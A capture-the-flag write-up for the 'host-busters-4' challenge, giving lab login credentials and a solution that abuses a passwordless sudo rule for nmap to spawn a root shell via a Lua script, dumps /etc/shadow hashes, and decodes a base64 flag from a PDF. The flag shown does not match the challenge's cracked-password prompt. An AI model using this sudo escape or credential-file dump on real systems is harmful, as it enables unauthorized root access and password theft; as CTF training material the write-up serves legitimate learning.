# host-busters-4

See if you can crack gh0st404’s password. 
Based on Ghost Town conversations, we suspect the password is found in common wordlists.

Submit the flag as flag{password}.

vim@gh0st404.deadface.io

Password: letmevim

## Solution

```
sudo -l -l 
Matching Defaults entries for gh0st404 on cefa9f4da2ac:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User gh0st404 may run the following commands on cefa9f4da2ac:

Sudoers entry:
    RunAsUsers: ALL
    Options: !authenticate
    Commands:
	/usr/bin/nmap

Sudoers entry:
    RunAsUsers: ALL
    RunAsGroups: ALL
    Options: !authenticate
    Commands:
	/etc/init.d/ssh start

```

```sh
TF=$(mktemp)
echo 'os.execute("/bin/bash")' > $TF
sudo -u root nmap --script=$TF

# copied proposal.pdf out of spookyboi and changed perms 777
cat /etc/shadow
# mort1cia:$6$53820c565eca77b2$WVK13lCDwtn1/DjcyCktOFkZBb8GX/s0N.lHv8nqRTdIcUFaN6UR1t2iadYXU7bR0DD8P3.JzNcW.ne5vgDfO.:19568:0:99999:7:::
# spookyboi:$6$238114ed7adfd724$8mKfFn9ywaU8SV0iQxgi/b8PRA.17ZCU77A9uwQzag/pTYMRbdKVADKoB7EWbU539xg.vy1ZP21Sy.B1WIKvA0:19568:0:99999:7:::
# vim:$6$d782b019e05a0a3f$0BP3fPEfLmd7P2WPrXlghsdLH.goxQwvxAyvkDbSYuqidXWhlgtT5f.HXpM1cx8KdgUyfOzDZw2G9O5CoucVL0:19568:0:99999:7:::
# gh0st404:$6$5d63619132db26f0$4FF5/xxtU1.OPzv2OdnWmB0mG5kqyMGUCAW8crE5ZqS24v6i1sM806eh8SigsZLxeJs/EtK0RJuB.eD.wTjLp/:19568:0:99999:7:::
```

```sh
tail -n 1 proposal.pdf 
# SG9zdCBCdXN0ZXJzIDQ6IGZsYWd7QWJ1czNfb0ZfcDB3M1J9Cg==
# Host Busters 4: flag{Abus3_oF_p0w3R}
```
